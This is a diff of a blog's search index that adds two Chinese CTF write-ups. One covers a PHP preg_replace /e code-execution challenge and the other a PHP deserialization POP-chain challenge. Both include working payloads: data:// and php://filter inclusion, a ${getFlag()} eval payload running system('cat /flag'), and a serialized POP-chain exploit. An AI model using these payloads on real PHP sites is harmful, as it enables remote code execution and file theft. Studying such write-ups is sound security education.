@@ -4,13 +4,50 @@
   
     
     <entry>
+      <title>replace()函数漏洞</title>
+      <link href="test56/undefined-undefined.html"/>
+      <url>test56/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>今天buu刷题，写了一道关于replace()函数漏洞的题目，感觉比较少见，现在记录一下。  </p><h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><p>打开题目，看到源码。  </p><p><a href="https://img.imgdb.cn/item/6066b9e08322e6675cb9b9f2.png"><img src="https://img.imgdb.cn/item/6066b9e08322e6675cb9b9f2.png"></a>  </p><p>可以看到，get方式上传text和file参数，首先要满足上传的text是一个文件，并且这个文件中有”I have a dream”字符串。  </p><pre><code>file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;这里的r参数表示只读形式打开。  </code></pre><p>满足第一个条件后接下来有一个正则匹配，过滤了flag字符，而我们上传的file参数就进入了include()函数里。  </p><p>很明显，这道题第一步要用include()函数来读取文件，不能读取flag，那就读取它给我们的提示：next.php。  </p><p>而第一个text传参很明显我们可以利用data://伪协议来写入内容，第二个include函数我们可以使用php://filter协议来读取文件。  </p><p>于是构造payload。  </p><pre><code>?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php  这里data://伪协议中的plain后面跟上的就是写入的内容。  </code></pre><p>进入下一个界面，得到了next.php源码。  </p><p><a href="https://img.imgdb.cn/item/6066bc868322e6675cbe53b3.png"><img src="https://img.imgdb.cn/item/6066bc868322e6675cbe53b3.png"></a>  </p><p>解码后得到源码。  </p><pre><code>&lt;?php$id = $_GET[&#39;id&#39;];$_SESSION[&#39;id&#39;] = $id;function complex($re, $str) &#123;return preg_replace(    &#39;/(&#39; . $re . &#39;)/ei&#39;,    &#39;strtolower(&quot;\\1&quot;)&#39;,    $str);&#125;foreach($_GET as $re =&gt; $str) &#123;echo complex($re, $str). &quot;\n&quot;;&#125;function getFlag()&#123;@eval($_GET[&#39;cmd&#39;]);&#125;</code></pre><p>这个才是重头，一眼看到里面的eval()函数，这是我们读取flag文件的关键，我们通过上传cmd参数来执行命令，而上面的正则匹配会返回最后匹配后的值，但是我们注意到，这个正则匹配和之前见过的有点不太一样。  </p><pre><code>/e 修正符使 preg_replace() 将 replacement 参数（第二个参数，字符串）当作 PHP 代码执行。</code></pre><p>也就是说我们传入的字符串在匹配后，它的第二个参数会被当作php代码执行，一般情况下，第二参数是用于替换的字符串或字符串数组，而这里却是’strtolower(“\\1”)’这样的字符串，有点不寻常，查一下什么意思。  </p><pre><code>反向引用对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#39;\n&#39; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。\\1也就表示\1，\1表示取出正则匹配后的第一个子匹配中的第一项，strtolower()的作用是把大写字母转换为小写字母。</code></pre><p>所以说这里第二个参数就是我们匹配后的第一个子匹配中的第一项。  </p><p>而正则匹配里的$re和$str是通过foreach($_GET as $re =&gt; $str)历遍上传的，也就是说如果我们上传index.php?hello=world那么$re=hello，$str=world（关于foreach()函数可以看之前的一篇博客详解）。 </p><p>所以说上面的正则匹配也就相当于eval(‘strtolower(“\1”);’)，这里的\\1也就是我们上传的$str,所以最后就是eval(‘strtolower(“$str”);’)。所以只要我们构造好$str就可以执行命令。  </p><p>而我们前面已经注意到了代码中的getFlag()函数，这个函数是我们最终要利用的函数。</p><p>那么我们就可以这样构造payload。  </p><pre><code>?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></pre><p>我们来解释一下这个payload。  </p><p>首先是传入的参数\S* ，在官方的漏洞利用中，给出的是.* 作为参数上传，但是在php中当非法字符为首字母时，只有点号会被替换成下划线，所以这里改为\S* 。  </p><p>其次就是我们为什么传入的的是${getFlag()}而不是直接传入getFlag()，这里有关php的可变变量。  </p><pre><code>在php中，双引号里面如果包含有变量，php解释器会进行解析；单引号中的变量不会被处理。  </code></pre><p>而我们看到strtolower(“\1”)中的\\1是被双引号括起来的，这也就是说我们如果直接上传getFlag()，那么结果就是strtolower(“getFalg()”)，输出的就是字符串，而不会执行getFlag()函数所以我们要上传${getFlag()}，而$$a = ${$a}，这样在经过双引号的解析后剩下的getFlag()就仍是函数，可以被eval()执行。  </p><p>最后我们上传cmd作为getFlag()的参数，执行命令，从而得到flag。（注意是在next.php页面上传。）  </p><p><a href="https://img.imgdb.cn/item/6066cbdd8322e6675cd02d67.png"><img src="https://img.imgdb.cn/item/6066cbdd8322e6675cd02d67.png"></a></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题考察的知识点挺多的，首先是php伪协议的运用，然后又考察了常见的replace()的漏洞的运用，同时又考察了可变变量，这个漏洞挺少见的，还是要多做积累，以防以后遇到不认识。  </p><p>附上关于这个漏洞的详细讲解。  </p><p><a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test56 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>php反序列化——pop链2</title>
-      <link href="%E7%BB%83%E4%B9%A0/undefined-undefined.html"/>
-      <url>%E7%BB%83%E4%B9%A0/undefined-undefined.html</url>
+      <link href="test55/undefined-undefined.html"/>
+      <url>test55/undefined-undefined.html</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<p>今天再复习一道php反序列化的题目，锻炼自己构造pop链的能力。  </p><h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h1><p>打开题目，直接就得到了源码。  </p><pre><code> &lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123;protected  $var;public function append($value)&#123;    include($value);&#125;public function __invoke()&#123;    $this-&gt;append($this-&gt;var);&#125;&#125;class Show&#123;public $source;public $str;public function __construct($file=&#39;index.php&#39;)&#123;    $this-&gt;source = $file;    echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;&#125;public function __toString()&#123;    return $this-&gt;str-&gt;source;&#125;public function __wakeup()&#123;    if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;        echo &quot;hacker&quot;;        $this-&gt;source = &quot;index.php&quot;;    &#125;&#125;&#125;class Test&#123;public $p;public function __construct()&#123;    $this-&gt;p = array();&#125;public function __get($key)&#123;    $function = $this-&gt;p;    return $function();&#125;if(isset($_GET[&#39;pop&#39;]))&#123;@unserialize($_GET[&#39;pop&#39;]);&#125;else&#123;$a=new Show;highlight_file(__FILE__);&#125;   </code></pre><p>代码很长，但是根据我们之前做题的思路，首先就是找到可以执行命令的代码或者函数。  </p><p>可以看到在Modifier类中就有一个include()函数，推测我们可以用这个函数来执行include()文件包含漏洞。  </p><pre><code>class Modifier &#123;protected  $var;public function append($value)&#123;    include($value);&#125;public function __invoke()&#123;    $this-&gt;append($this-&gt;var);&#125;&#125;  </code></pre><p>可以看到，include()函数里的变量$value是在下面的_invoke()方法中被赋值的，从之前的那道题目中可以知道，如果把一个类的对象当作函数调用，那么就会触发invoke()方法，而这个方法会调用一个自定义的方法，将把保护属性$var传入自定义方法append($value)，也就是将var的值赋予value，所以我们要想执行include()函数，就要给var传入参数。  </p><p>那么我们如何触发_invoke()方法呢？这里我们可以看到下面的test类里有可用的函数。  </p><pre><code>class Test&#123;public $p;function __construct()&#123;$this-&gt;p = array();&#125;public function __get($key)&#123;$function = $this-&gt;p;return $function();&#125;  </code></pre><p>很明显，在Test类里的_get()方法会将p的值赋予$function并返回形如函数的形式$function()，而get()方法只会在访问不可访问或者不存在的属性的时候才会触发那么从哪里找一个不存在的属性呢？  </p><p>这就要看到Show类了。</p><pre><code>class Show&#123;public $source;public $str;public function __construct($file=&#39;index.php&#39;)&#123;    $this-&gt;source = $file;    echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;&#125;public function __toString()&#123;    return $this-&gt;str-&gt;source;&#125;public function __wakeup()&#123;    if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;        echo &quot;hacker&quot;;        $this-&gt;source = &quot;index.php&quot;;    &#125;&#125;&#125;</code></pre><p>首先可以看到的是这个wakeup()方法，在反序列化开始的时候就会调用这个函数，而这个函数里又有一个正则匹配，匹配的是属性source，<strong>在这里要注意一下，在正则匹配时，是把属性source当作字符串来处理的。</strong>这让我们很容易就联系到上面的tostring_()方法，当一个类对象被当作字符串处理的时候，这个方法就会被返回。这里返回的$this-&gt;str-&gt;source;指的是返回str属性值的source属性，而这个source属性不正好就是Test类里没有的属性吗？  </p><p>所以到了这里我们大致就可以理出pop链了：  </p><p>我们首先从Show类开始，先触发wakeup方法，在wakeup的正则匹配中触发tostring方法，我们给str赋值Test()类，这样返回的就是Test类的source属性，而Test类里没有该属性，从而触发了get()方法，在get方法中我们给p赋值为Modifier类，这样最后返回的就是Modifier()，这样就是把类对象当作函数了，从而可以触发invoke()方法，而我们通过上传var参数来利用include()的文件包含漏洞。  </p><pre><code>unserialize()--&gt;__wakeup()--&gt;toString()--&gt;__get()--&gt;__invoke()--&gt;append()--&gt;include()  </code></pre><p>我们这样构造  </p><pre><code>&lt;?phpclass Modifier &#123;protected  $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;//伪协议利用include()函数漏洞。&#125;class Test&#123;public $p;    &#125;class Show&#123;public $source;public $str;public function __construct()&#123;    $this-&gt;str = new Test();&#125;&#125;$a = new Show();$a-&gt;source = new Show();//这里是一个要注意的点，因为tostring()是在wakeup()方法中触发的，而这时匹配的是$source,所以我们要给source赋值show()类以此来进行接下来的tostring()方法。$a-&gt;source-&gt;str-&gt;p = new Modifier();//__get返回的p触发__invokeecho serialize($a);?&gt;得到O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot; * var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;N;&#125;&#125;</code></pre><p>由于var是protected类型，所以payload中需要用%00把它的位数补齐，或者直接最后url编码输出<br>最后传入pop得到base64编码，解码即得flag。  </p><p><a href="https://img.imgdb.cn/item/6064ac528322e6675cf319a5.png"><img src="https://img.imgdb.cn/item/6064ac528322e6675cf319a5.png"></a>  </p><p>解码可得。  </p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这道题目虽然代码大变样，但是思路不变，依旧是找可以执行命令的语句和能够操控的pop链，只要对魔术方法足够了解，代码审计能力足够强就可以做到。所以说还是要多加练习啊。</p>]]></content>
       
       
+      <categories>
+          
+          <category> test55 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
       
     </entry>
     
